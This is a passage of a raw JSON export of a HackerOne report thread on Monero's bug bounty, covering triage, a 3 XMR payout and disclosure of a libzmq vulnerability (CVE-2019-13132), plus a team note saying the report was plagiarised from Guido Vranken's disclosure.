syZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026X-Amz-Signature=46e3e2188d344dd3c5712063021040e805dd5206cdae625c51102639fa57b1f8"}],"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5431898,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@anonimal did I classify the vulnerability correctly? \nwaiting","markdown_message":"\u003cp\u003e\u003ca href=\"/anonimal\"\u003e@anonimal\u003c/a\u003e did I classify the vulnerability correctly? \u003cbr\u003e\nwaiting\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-25T21:55:17.596Z","updated_at":"2019-07-25T21:55:17.596Z","actor":{"username":"evertonmelo","cleared":false,"url":"/evertonmelo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/297/601/ad3b433db0eced5113f6d2c7420e67426dea55dc_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5432417,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @evertonmelo,\n\n\u003e@anonimal did I classify the vulnerability correctly? \n\nNot really, because the vulnerability is related to zmq (it's a zmq overflow, not monero overflow). I would rather classify this issue as a security design issue because it's a dependency issue rather than a monero code issue but, either way, it's not a big deal - so I wouldn't worry about it. On a related note, you also may want to read a markdown guide to help provide visually-better reports for the future.\n\nRegarding payout, I notified luigi several days ago. He should be able to payout as soon as he's available to do so. Thank you for your patience.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/evertonmelo\"\u003e@evertonmelo\u003c/a\u003e,\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003e@anonimal did I classify the vulnerability correctly? \u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eNot really, because the vulnerability is related to zmq (it\u0026#39;s a zmq overflow, not monero overflow). I would rather classify this issue as a security design issue because it\u0026#39;s a dependency issue rather than a monero code issue but, either way, it\u0026#39;s not a big deal - so I wouldn\u0026#39;t worry about it. On a related note, you also may want to read a markdown guide to help provide visually-better reports for the future.\u003c/p\u003e\n\n\u003cp\u003eRegarding payout, I notified luigi several days ago. He should be able to payout as soon as he\u0026#39;s available to do so. Thank you for your patience.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-26T00:15:15.954Z","updated_at":"2019-07-26T00:15:15.954Z","actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5432418,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-26T00:15:46.723Z","updated_at":"2019-07-26T00:15:46.723Z","additional_data":{"added_weaknesses":[{"id":57,"name":"Violation of Secure Design Principles"}],"removed_weaknesses":[{"id":15,"name":"Integer Overflow"}]},"actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5541624,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sent 3 XMR: \u003cbac2949155724d05e6e4ebca472d41bc337da02dd9ca4dc7eba0b141a9075464\u003e","markdown_message":"\u003cp\u003eSent 3 XMR: \u0026lt;bac2949155724d05e6e4ebca472d41bc337da02dd9ca4dc7eba0b141a9075464\u0026gt;\u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-09T21:10:46.187Z","updated_at":"2019-08-09T21:10:46.187Z","actor":{"username":"luigi1111w","cleared":false,"url":"/luigi1111w","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5542738,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"received.\nIt was an honor to work with you.\n\n","markdown_message":"\u003cp\u003ereceived.\u003cbr\u003e\nIt was an honor to work with you.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-10T01:10:34.128Z","updated_at":"2019-08-10T01:10:34.128Z","actor":{"username":"evertonmelo","cleared":false,"url":"/evertonmelo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/297/601/ad3b433db0eced5113f6d2c7420e67426dea55dc_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5542773,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@anonimal  @luigi1111w \ni know the h1 platform has a hall of fame \nI love the monero project.  \nbut can you send me a thank you on twitter( https://twitter.com/monero ) ? \n\nsome like: \"thank you Everton melo your work, our currency remains safe.\", \nor\n\"thank you Everton melo your report was a good job, keep it up.\"\n\nplease.\n\nSince I started my work, I've always liked MONERO. so this tweet would be invaluable to me.","markdown_message":"\u003cp\u003e\u003ca href=\"/anonimal\"\u003e@anonimal\u003c/a\u003e  \u003ca href=\"/luigi1111w\"\u003e@luigi1111w\u003c/a\u003e \u003cbr\u003e\ni know the h1 platform has a hall of fame \u003cbr\u003e\nI love the monero project.\u003cbr\u003e\u003cbr\u003e\nbut can you send me a thank you on twitter( \u003ca title=\"https://twitter.com/monero\" href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fmonero\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://twitter.com/monero\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e ) ? \u003c/p\u003e\n\n\u003cp\u003esome like: \u0026quot;thank you Everton melo your work, our currency remains safe.\u0026quot;, \u003cbr\u003e\nor\u003cbr\u003e\n\u0026quot;thank you Everton melo your report was a good job, keep it up.\u0026quot;\u003c/p\u003e\n\n\u003cp\u003eplease.\u003c/p\u003e\n\n\u003cp\u003eSince I started my work, I\u0026#39;ve always liked MONERO. so this tweet would be invaluable to me.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-10T01:23:50.765Z","updated_at":"2019-08-10T01:23:50.765Z","actor":{"username":"evertonmelo","cleared":false,"url":"/evertonmelo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/297/601/ad3b433db0eced5113f6d2c7420e67426dea55dc_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5580195,"is_internal":false,"editable":false,"type":"Activities::SwagAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2019-08-14T23:42:44.828Z","updated_at":"2019-08-14T23:42:44.828Z","actor":{"url":"/monero","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Monero"}},"reporter":{"username":"evertonmelo","url":"/evertonmelo"},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5580204,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @evertonmelo,\n\n\u003e but can you send me a thank you on twitter( https://twitter.com/monero ) ? \n\nWe cannot do such a thing until this report is properly disclosed. You'll be sure to get credit though when I do our VRP summaries. For example, the most recent one was https://www.reddit.com/r/Monero/comments/cbahaw/security_advisory_vrp_summary_october_2018/\n\nIf you have a twitter handle, I'll try to include you in my next VRP related tweet from `@whoisanonimal` since I don't have access to `@monero`.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/evertonmelo\"\u003e@evertonmelo\u003c/a\u003e,\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003ebut can you send me a thank you on twitter( \u003ca title=\"https://twitter.com/monero\" href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fmonero\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://twitter.com/monero\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e ) ? \u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eWe cannot do such a thing until this report is properly disclosed. You\u0026#39;ll be sure to get credit though when I do our VRP summaries. For example, the most recent one was \u003ca title=\"https://www.reddit.com/r/Monero/comments/cbahaw/security_advisory_vrp_summary_october_2018/\" href=\"/redirect?url=https%3A%2F%2Fwww.reddit.com%2Fr%2FMonero%2Fcomments%2Fcbahaw%2Fsecurity_advisory_vrp_summary_october_2018%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.reddit.com/r/Monero/comments/cbahaw/security_advisory_vrp_summary_october_2018/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eIf you have a twitter handle, I\u0026#39;ll try to include you in my next VRP related tweet from \u003ccode\u003e@whoisanonimal\u003c/code\u003e since I don\u0026#39;t have access to \u003ccode\u003e@monero\u003c/code\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-14T23:45:00.478Z","updated_at":"2019-08-14T23:45:00.478Z","actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5581016,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"alright, your message, there will great help for my activities. thank your again.","markdown_message":"\u003cp\u003ealright, your message, there will great help for my activities. thank your again.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-15T02:58:24.452Z","updated_at":"2019-08-15T02:58:24.452Z","actor":{"username":"evertonmelo","cleared":false,"url":"/evertonmelo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/297/601/ad3b433db0eced5113f6d2c7420e67426dea55dc_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6131070,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"For the record, after further review, the 4.1 series (of which the repro build is using) appears to *not* be affected by CVE-2019-6250 but, definitively, *is* affected by CVE-2019-13132. So, the reward is still just.\n\nI cannot attest to which build process Riccardo used for the latest release, but we must assume the worst in this case and that the binaries were built using the scripts (though, that could be unlikely).\n\nI have provided https://github.com/monero-project/monero/pull/6022 as a fix. We will disclose the report after the upcoming release. Thanks again.","markdown_message":"\u003cp\u003eFor the record, after further review, the 4.1 series (of which the repro build is using) appears to \u003cem\u003enot\u003c/em\u003e be affected by CVE-2019-6250 but, definitively, \u003cem\u003eis\u003c/em\u003e affected by CVE-2019-13132. So, the reward is still just.\u003c/p\u003e\n\n\u003cp\u003eI cannot attest to which build process Riccardo used for the latest release, but we must assume the worst in this case and that the binaries were built using the scripts (though, that could be unlikely).\u003c/p\u003e\n\n\u003cp\u003eI have provided \u003ca title=\"https://github.com/monero-project/monero/pull/6022\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmonero-project%2Fmonero%2Fpull%2F6022\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/monero-project/monero/pull/6022\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e as a fix. We will disclose the report after the upcoming release. Thanks again.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-25T01:42:17.114Z","updated_at":"2019-10-25T01:42:17.114Z","actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6131076,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-25T01:43:04.120Z","updated_at":"2019-10-25T01:43:04.120Z","additional_data":{"old_title":"CVE-2019-6250 - libzmq 4.x is vulnerable.","new_title":"CVE-2019-13132 - libzmq 4.1 series is vulnerable"},"actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6131092,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-25T01:47:27.523Z","updated_at":"2019-10-25T01:47:27.523Z","actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"evertonmelo","url":"/evertonmelo"},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6338506,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-11-18T21:39:21.669Z","updated_at":"2019-11-18T21:39:21.669Z","first_to_agree":true,"actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6341014,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2019-11-18T23:01:35.114Z","updated_at":"2019-11-18T23:01:35.114Z","actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":24913,"category":"team","content":"NB: this disclosure [was stolen (!!) from Guido Vranken's original disclosure](https://twitter.com/GuidoVranken/status/1317547557481054208) without any credit given to him. We missed that this was ripped straight from there as our focus was on reproducing the issue and fixing it. This is beyond scummy. Please don't do this. We've reached out to Guido to pay him a bounty; sadly we can't redact the bounty from Everton Melo.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eNB: this disclosure \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FGuidoVranken%2Fstatus%2F1317547557481054208\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewas stolen (!!) from Guido Vranken\u0026#39;s original disclosure\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e without any credit given to him. We missed that this was ripped straight from there as our focus was on reproducing the issue and fixing it. This is beyond scummy. Please don\u0026#39;t do this. We\u0026#39;ve reached out to Guido to pay him a bounty; sadly we can\u0026#39;t redact the bounty from Everton Melo.\u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}